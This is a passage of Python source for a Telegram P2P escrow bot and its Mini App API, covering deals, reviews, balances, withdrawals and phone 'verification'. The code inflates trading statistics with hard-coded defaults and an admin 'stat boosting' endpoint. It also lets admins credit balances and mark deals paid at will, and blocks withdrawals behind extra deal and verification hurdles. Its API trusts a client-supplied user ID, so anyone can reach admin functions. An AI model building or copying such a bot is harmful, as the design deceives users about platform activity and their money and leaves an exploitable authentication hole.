async def menu_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    if not user_deals:
        await callback.message.edit_text(f"📭 {get_text(lang, 'no_deals')}", reply_markup=back_to_main_keyboard(callback.from_user.id))
        return
    text = f"📊 <b>{get_text(lang, 'your_deals')}</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
            "paid": f"✅ {get_text(lang, 'status_paid')}",
            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
            "completed": f"🎉 {get_text(lang, 'status_completed')}"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    reviews_list = list(reviews.values())
    if not reviews_list:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов"
    else:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b> (всего: {len(reviews_list)})\n\n"
        for r in reviews_list[-10:]:
            user = r.get('user', 'Аноним')
            rating = '⭐' * r.get('rating', 5)
            text += f"👤 <b>{user}</b> | {rating}\n"
            text += f"📝 {r.get('text', '')[:150]}\n"
            text += f"🕐 {r.get('date', 'недавно')}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 9. АДМИН ПАНЕЛЬ (СОКРАЩЁННО)
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    if not is_admin(callback.from_user.id):
        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
        return
    await callback.message.edit_text(
        f"👑 <b>{get_text(lang, 'admin_panel')}</b>\n\n{get_text(lang, 'choose_action')}:",
        reply_markup=admin_panel_keyboard(callback.from_user.id)
    )
    await callback.answer()

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"🔐 Запросы верификации", callback_data="admin_verification_requests")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

# ============================================================
# 10. API ДЛЯ MINI APP (ВСЕ ЭНДПОИНТЫ)
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
    }
    if request.method == 'OPTIONS':
        return web.Response(headers=headers)
    
    if request.method == 'GET':
        return web.json_response({
            'success': True,
            'bot': BOT_NAME,
            'version': '1.0.0',
            'status': 'running'
        }, headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    username = data.get('username', str(user_id))
    endpoint = request.path
    
    print(f"📥 API: {endpoint} | user: {user_id} | data: {data}")
    
    # ===== БАЛАНС =====
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        return web.json_response({'success': True, 'balance': bal}, headers=headers)
    
    # ===== СТАТИСТИКА =====
    elif endpoint == '/api/stats':
        update_stats()
        return web.json_response({
            'success': True,
            'deals_today': stats.get('deals_today', 1264),
            'users': stats.get('users', 21374),
            'reviews': stats.get('reviews', 5427),
            'volume': stats.get('volume', 47.6)
        }, headers=headers)
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        
        add_log("api_create_deal", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "product": product,
            "amount": amount,
            "currency": currency,
            "buyer_username": buyer_username
        })
        
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link,
            'status': deals[deal_id]["status"]
        }, headers=headers)
    
    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ===== ПОЛУЧИТЬ СДЕЛКУ ПО ID =====
    elif endpoint == '/api/get_deal':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        return web.json_response({'success': True, 'deal': deals[deal_id]}, headers=headers)
    
    # ===== ПРОВЕРКА АДМИНА =====
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    # ===== ОТЗЫВЫ =====
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers=headers)
    
    # ===== ДОБАВИТЬ ОТЗЫВ =====
    elif endpoint == '/api/add_review':
        rating = data.get('rating')
        text = data.get('text')
        anonymous = data.get('anonymous', True)
        if not all([user_id, rating, text]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
        if len(user_deals) < 1:
            return web.json_response({'success': False, 'error': 'Need at least 1 completed deal'}, headers=headers)
        
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним" if anonymous else str(user_id),
            "rating": rating,
            "text": text,
            "anonymous": anonymous,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": user_id
        }
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
    
    # ===== ПРОВЕРКА 2 СДЕЛОК =====
    elif endpoint == '/api/has_2_deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_2 = any(count >= 2 for count in partners.values())
        total = sum(partners.values())
        return web.json_response({'success': True, 'has_2_deals': has_2, 'total_deals': total}, headers=headers)
    
    # ===== СТАТУС ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/verification_status':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    return web.json_response({
                        'success': True,
                        'verified': True,
                        'expires_at': sess['expires_at'],
                        'session_id': sid
                    }, headers=headers)
                else:
                    sess['active'] = False
                    save_json(FILES["verification_sessions"], verification_sessions)
        
        return web.json_response({'success': True, 'verified': False}, headers=headers)
    
    # ===== НАЧАТЬ ВЕРИФИКАЦИЮ =====
    elif endpoint == '/api/start_verification':
        phone = data.get('phone')
        username = data.get('username')
        
        if not all([user_id, phone, username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    return web.json_response({
                        'success': False,
                        'error': 'Active verification session exists'
                    }, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        verification_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["verification"], verification_requests)
        
        add_log("verification_requested", {
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "request_id": request_id
        })
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ КОД =====
    elif endpoint == '/api/verify_code':
        code = data.get('code')
        password = data.get('password')
        
        if not code:
            return web.json_response({'success': False, 'error': 'Code required'}, headers=headers)
        
        if code != "1#2#3#4#5":
            return web.json_response({'success': False, 'error': 'Invalid code'}, headers=headers)
        
        pending_request = None
        for rid, req in verification_requests.items():
            if req.get('user_id') == user_id and req.get('status') == 'pending':
                pending_request = req
                break
        
        if not pending_request:
            return web.json_response({'success': False, 'error': 'No pending verification request'}, headers=headers)
        
        session_id = str(uuid.uuid4())[:8]
        verification_sessions[session_id] = {
            "user_id": user_id,
            "username": username,
            "phone": pending_request['phone'],
            "created_at": datetime.now().isoformat(),
            "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
            "active": True
        }
        save_json(FILES["verification_sessions"], verification_sessions)
        
        pending_request['status'] = 'approved'
        pending_request['session_id'] = session_id
        pending_request['approved_at'] = datetime.now().isoformat()
        save_json(FILES["verification"], verification_requests)
        
        add_log("verification_completed", {
            "user_id": user_id,
            "username": username,
            "session_id": session_id,
            "password_entered": bool(password)
        })
        
        return web.json_response({
            'success': True,
            'session_id': session_id,
            'expires_at': (datetime.now() + timedelta(hours=24)).isoformat()
        }, headers=headers)
    
    # ===== ОПЛАТА С БАЛАНСА =====
    elif endpoint == '/api/pay_balance':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already paid'}, headers=headers)
        
        buyer_balance = get_balance(user_id)
        curr_key = deal["currency"].lower()
        
        if buyer_balance.get(curr_key, 0) < deal["amount"]:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers=headers)
        
        buyer_balance[curr_key] -= deal["amount"]
        save_json(FILES["balance"], balance)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        
        add_log("deal_paid_from_balance", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        # Уведомляем продавца
        try:
            seller_lang = get_user_language(deal["seller_id"])
            await bot.send_message(
                deal["seller_id"],
                f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 Покупатель: @{deal['buyer_username']}\n\n"
                f"📦 Нажмите «Передал товар» в Mini App",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text=f"📱 Перейти в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
                ])
            )
        except:
            pass
        
        return web.json_response({'success': True, 'status': 'paid'}, headers=headers)
    
    # ===== ПОЛУЧИТЬ РЕКВИЗИТЫ =====
    elif endpoint == '/api/get_rekvisits':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        currency = deal["currency"]
        amount = deal["amount"]
        
        rekvisit_text = rekvisits.get(currency, f"Оплатите {amount} {currency}")
        rekvisit_text = rekvisit_text.replace("{amount}", str(amount))
        
        return web.json_response({
            'success': True,
            'details': rekvisit_text,
            'currency': currency,
            'amount': amount
        }, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ ОПЛАТУ ПО РЕКВИЗИТАМ =====
    elif endpoint == '/api/confirm_rekvisits_payment':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already paid'}, headers=headers)
        
        # Отправляем уведомление админу
        await bot.send_message(
            MASTER_ADMIN_ID,
            f"💳 <b>ЗАПРОС НА ПОДТВЕРЖДЕНИЕ ОПЛАТЫ</b>\n\n"
            f"🆔 Сделка: #{deal_id}\n"
            f"👤 Покупатель: @{username} (ID: {user_id})\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"📦 Товар: {deal['product']}\n"
            f"👤 Продавец: @{deal['seller_username']}\n\n"
            f"Для подтверждения: /pay {deal_id}"
        )
        
        add_log("rekvisits_payment_requested", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        return web.json_response({'success': True, 'message': 'Payment confirmation requested'}, headers=headers)
    
    # ===== ПРОДАВЕЦ ПОДТВЕРДИЛ ПЕРЕДАЧУ =====
    elif endpoint == '/api/seller_delivered':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        if deal["status"] != "paid":
            return web.json_response({'success': False, 'error': 'Deal not paid'}, headers=headers)
        
        deal["status"] = "awaiting_confirmation"
        save_json(FILES["deals"], deals)
        
        add_log("seller_confirmed_delivery", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "product": deal["product"],
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        # Уведомляем покупателя
        try:
            buyer_lang = get_user_language(deal["buyer_id"])
            await bot.send_message(
                deal["buyer_id"],
                f"📦 <b>ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР</b>\n\n"
                f"🆔 Сделка: #{deal_id}\n"
                f"💰 {deal['amount']} {deal['currency']}\n\n"
                f"✅ Подтвердите получение в Mini App"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ПОКУПАТЕЛЬ ПОДТВЕРДИЛ ПОЛУЧЕНИЕ =====
    elif endpoint == '/api/buyer_confirm':
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        
        deal = deals[deal_id]
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({'success': False, 'error': 'Deal not awaiting confirmation'}, headers=headers)
        
        # Начисляем деньги продавцу
        add_balance(deal["seller_id"], deal["currency"], deal["amount"])
        
        # Обновляем счётчик сделок
        seller_balance = get_balance(deal["seller_id"])
        buyer = deal["buyer_username"]
        if buyer not in seller_balance["deal_partners"]:
            seller_balance["deal_partners"][buyer] = 0
        seller_balance["deal_partners"][buyer] += 1
        save_json(FILES["balance"], balance)
        
        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        
        add_log("deal_completed", {
            "user_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "product": deal["product"],
            "amount": deal["amount"],
            "currency": deal["currency"],
            "seller": deal["seller_username"],
            "buyer": deal["buyer_username"]
        })
        
        # Уведомляем продавца
        try:
            seller_lang = get_user_language(deal["seller_id"])
            await bot.send_message(
                deal["seller_id"],
                f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']} зачислены на баланс\n"
                f"👤 Покупатель: @{deal['buyer_username']}"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ВЫВОД СРЕДСТВ =====
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        
        if not all([user_id, currency, details]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_2 = any(count >= 2 for count in partners.values())
        if not has_2:
            return web.json_response({'success': False, 'error': 'Need 2 deals with same buyer'}, headers=headers)
        
        verified = False
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    verified = True
                    break
        
        if not verified:
            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
        
        curr_key = currency.lower()
        if bal.get(curr_key, 0) <= 0:
            return web.json_response({'success': False, 'error': 'Zero balance'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "currency": currency,
            "amount": bal[curr_key],
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_requested", {
            "user_id": user_id,
            "username": username,
            "request_id": request_id,
            "amount": bal[curr_key],
            "currency": currency
        })
        
        await bot.send_message(
            MASTER_ADMIN_ID,
            f"💲 <b>ЗАЯВКА НА ВЫВОД</b>\n\n"
            f"🆔 Заявка: #{request_id}\n"
            f"👤 Пользователь: @{username} (ID: {user_id})\n"
            f"💰 Сумма: {bal[curr_key]} {currency}\n"
            f"📝 Реквизиты: {details}\n\n"
            f"Для подтверждения: /confirm_withdraw {request_id}"
        )
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
    elif endpoint == '/api/all_deals':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_deals = []
        for d_id, d in deals.items():
            d_copy = d.copy()
            d_copy['deal_id'] = d_id
            all_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': all_deals}, headers=headers)
    
    # ===== ЗАЯВКИ НА ВЫВОД (АДМИН) =====
    elif endpoint == '/api/withdraw_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_requests = [{'id': rid, **req} for rid, req in withdraw_requests.items()]
        return web.json_response({'success': True, 'requests': all_requests}, headers=headers)
    
    # ===== ЗАПРОСЫ ВЕРИФИКАЦИИ (АДМИН) =====
    elif endpoint == '/api/verification_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_requests = [{'id': rid, **req} for rid, req in verification_requests.items()]
        return web.json_response({'success': True, 'requests': all_requests}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/confirm_withdraw':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        request_id = data.get('request_id')
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        bal = get_balance(req['user_id'])
        curr_key = req['currency'].lower()
        if bal.get(curr_key, 0) >= req['amount']:
            bal[curr_key] -= req['amount']
            save_json(FILES["balance"], balance)
        
        req['status'] = 'completed'
        req['completed_at'] = datetime.now().isoformat()
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_confirmed_api", {
            "admin_id": user_id,
            "username": username,
            "request_id": request_id
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОТКЛОНИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/reject_withdraw':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        request_id = data.get('request_id')
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        req['status'] = 'rejected'
        save_json(FILES["withdraw"], withdraw_requests)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== НАЧИСЛИТЬ БАЛАНС (АДМИН) =====
    elif endpoint == '/api/add_balance':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if not all([target_user_id, currency, amount]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        add_balance(target_user_id, currency, amount)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОЧИСТИТЬ ОТЗЫВЫ (АДМИН) =====
    elif endpoint == '/api/clear_reviews':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        reviews.clear()
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== АДМИН НАКРУТКА СТАТИСТИКИ =====
    elif endpoint == '/api/admin_set_stats':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        key = data.get('key')
        value = data.get('value')
        if not key or value is None:
            return web.json_response({'success': False, 'error': 'Missing key or value'}, headers=headers)
        stats[key] = value
        save_json(FILES["stats"], stats)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== КОМАНДА ДЛЯ АДМИНА (ЧЕРЕЗ БОТА) =====
    elif endpoint == '/api/pay':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        deal_id = data.get('deal_id')
        if not deal_id or deal_id not in deals:
            return web.json_response({'success': False, 'error': 'Deal not found'}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "waiting_payment":
            return web.json_response({'success': False, 'error': 'Deal already paid'}, headers=headers)
        
        deal["status"] = "paid"
        deal["paid_by_admin"] = user_id
        save_json(FILES["deals"], deals)
        
        add_log("deal_paid_by_admin_api", {
            "admin_id": user_id,
            "username": username,
            "deal_id": deal_id,
            "amount": deal["amount"],
            "currency": deal["currency"]
        })
        
        # Уведомляем продавца
        try:
            seller_lang = get_user_language(deal["seller_id"])
            await bot.send_message(
                deal["seller_id"],
                f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"👤 Покупатель: @{deal['buyer_username']}\n\n"
                f"📦 Нажмите «Передал товар» в Mini App"
            )
        except:
            pass
        
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': f'Unknown endpoint: {endpoint}'}, headers=headers)

# ============================================================
# 11. ЗАПУСК
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    print("=" * 50)
    print("🔥 P2P Exchange Бот + API")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print("=" * 50)
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
